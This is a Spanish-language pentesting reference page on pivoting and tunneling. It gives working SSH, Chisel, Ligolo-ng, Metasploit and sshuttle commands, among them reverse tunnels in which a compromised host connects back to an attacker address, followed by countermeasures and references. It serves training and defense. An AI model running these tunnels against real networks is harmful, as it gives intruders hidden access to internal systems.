# Pivoting y Tunneling

## Descripción
El pivoting es la técnica de usar un host comprometido como punto de acceso para alcanzar redes internas que no son directamente accesibles desde la máquina del atacante. El tunneling es el mecanismo mediante el cual se encapsula el tráfico de red dentro de otro protocolo (SSH, HTTP, DNS, etc.) para atravesar firewalls, segmentos de red o restricciones de acceso. Combinadas, estas técnicas permiten al atacante extender su alcance a toda la infraestructura interna partiendo de un único punto de compromiso, manteniendo el tráfico cifrado y difícil de detectar. Son fundamentales en pentests de redes corporativas con múltiples segmentos.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1572 (Protocol Tunneling); T1090 (Proxy); T1090.001 (Proxy: Internal Proxy)
- **Plataforma**: Multi
- **Dificultad**: Avanzada

## Herramientas
- **SSH** (`-L`, `-R`, `-D`) — port forwarding local, remoto y dinámico (SOCKS proxy)
- **Chisel** (https://github.com/jpillora/chisel) — túnel TCP/HTTP rápido, escrito en Go, binario único
- **Ligolo-ng** (https://github.com/nicocha30/ligolo-ng) — túnel de red completo con interfaz TUN, sin necesidad de SOCKS
- **Metasploit** (`autoroute`, `portfwd`) — pivoting integrado en sesiones Meterpreter
- **ProxyChains** (`proxychains4`) — forzar aplicaciones a usar proxy SOCKS
- **sshuttle** — VPN transparente sobre SSH que no requiere configuración en el servidor
- **socat** — relay de puertos bidireccional versátil

## Comandos / Ejemplos

### SSH Port Forwarding — Local
```bash
# Redirigir puerto local al servicio interno a través del host comprometido
# Escenario: acceder a 192.168.100.12:5000 (red interna) a través de pivot (10.10.10.50)
ssh -L 5000:192.168.100.12:5000 -N user@10.10.10.50

# Ahora acceder al servicio interno desde el atacante
curl http://127.0.0.1:5000

# Múltiples forwarding en una conexión
ssh -L 8080:192.168.100.10:80 -L 3306:192.168.100.11:3306 -N user@10.10.10.50
```

### SSH Port Forwarding — Dinámico (SOCKS Proxy)
```bash
# Crear proxy SOCKS5 en el puerto local 1080
ssh -D 1080 -N user@10.10.10.50

# Usar ProxyChains para redirigir herramientas a través del proxy
# Configurar /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Escanear red interna a través del proxy
proxychains4 nmap -sT -Pn 192.168.100.0/24 -p 22,80,445

# Usar curl a través del proxy
curl --socks5 127.0.0.1:1080 http://192.168.100.12:8080
```

### SSH Port Forwarding — Remoto (Reverse)
```bash
# Desde el host comprometido, exponer servicio interno al atacante
# Ejecutar en el host comprometido:
ssh -R 8080:192.168.100.12:80 -N attacker@10.10.14.5

# En el atacante, el servicio interno está disponible en localhost:8080
curl http://127.0.0.1:8080
```

### Chisel — túnel TCP sobre HTTP
```bash
# En el atacante: iniciar servidor
chisel server --reverse --port 8081

# En el host comprometido: conectar como cliente con proxy SOCKS reverso
./chisel client 10.10.14.5:8081 R:socks

# Resultado: proxy SOCKS5 disponible en el atacante en 127.0.0.1:1080
# Usar con ProxyChains
proxychains4 nmap -sT -Pn 192.168.100.0/24

# Forwarding de puerto específico
./chisel client 10.10.14.5:8081 R:3306:192.168.100.11:3306
```

### Ligolo-ng — túnel de red completo
```bash
# En el atacante: iniciar proxy
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Crear interfaz TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# En el host comprometido: conectar agente
./ligolo-agent -connect 10.10.14.5:11601 -ignore-cert

# En el proxy: seleccionar sesión y añadir ruta
ligolo-ng » session
ligolo-ng » ifconfig  # ver subredes del pivot
ligolo-ng » start

# Añadir ruta a la subred interna
sudo ip route add 192.168.100.0/24 dev ligolo

# Ahora se puede acceder directamente a la red interna SIN proxy
nmap -sT 192.168.100.0/24 -p 22,80,445
```

### Metasploit — autoroute y portfwd
```
# Desde una sesión Meterpreter en el host pivot
meterpreter > run autoroute -s 192.168.100.0/24
# [*] Route added to subnet 192.168.100.0/255.255.255.0

# Escanear la subred interna a través del pivot
meterpreter > background
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.0/24
set PORTS 22,80,445,3389
run

# Port forwarding específico
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.100.12
# Ahora en el atacante: rdesktop 127.0.0.1:3389

# Configurar proxy SOCKS con Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

### sshuttle — VPN transparente
```bash
# Redirigir toda la subred a través de SSH (no requiere root en el servidor)
sshuttle -r user@10.10.10.50 192.168.100.0/24

# Con autenticación por clave
sshuttle -r user@10.10.10.50 --ssh-cmd "ssh -i key.pem" 192.168.100.0/24

# Resultado: todo el tráfico a 192.168.100.0/24 pasa a través del túnel SSH
# No necesita ProxyChains — funciona transparentemente
```

## Contramedidas
- Segmentar la red con firewalls internos que limiten la comunicación entre segmentos
- Implementar monitoreo de tráfico este-oeste (entre hosts internos) además de norte-sur
- Detectar túneles SSH inusuales: conexiones SSH de larga duración con poco tráfico interactivo pero mucho tráfico de datos
- Monitorear la creación de interfaces TUN/TAP y cambios en tablas de enrutamiento en hosts
- Implementar Network Detection and Response (NDR) para identificar patrones de tunneling (DNS tunneling, HTTP tunneling)
- Aplicar el principio de mínimo privilegio en reglas de firewall: denegar por defecto, permitir solo lo necesario
- Deshabilitar port forwarding en la configuración de SSH donde no sea necesario: `AllowTcpForwarding no`
- Auditar conexiones de red salientes desde servidores internos que no deberían iniciar conexiones

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1572: Protocol Tunneling. https://attack.mitre.org/techniques/T1572/
- MITRE Corporation. (2024). ATT&CK Technique T1090: Proxy. https://attack.mitre.org/techniques/T1090/
- jpillora. (s.f.). *Chisel* [Software]. GitHub. https://github.com/jpillora/chisel
- nicocha30. (s.f.). *Ligolo-ng* [Software]. GitHub. https://github.com/nicocha30/ligolo-ng
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Allen, L. (2018). *Mastering Kali Linux for Advanced Penetration Testing* (2nd ed.). Packt Publishing.
- Notas del proyecto: notas-md/HNotes/HNotes/TryHackMe/Lateral Movement and Pivoting.md
- Notas del proyecto: notas-md/HNotes/HNotes/TryHackMe/Voyage Room.md
- Notas del proyecto: notas-md/HNotes/HNotes/General/MSFConsole.md
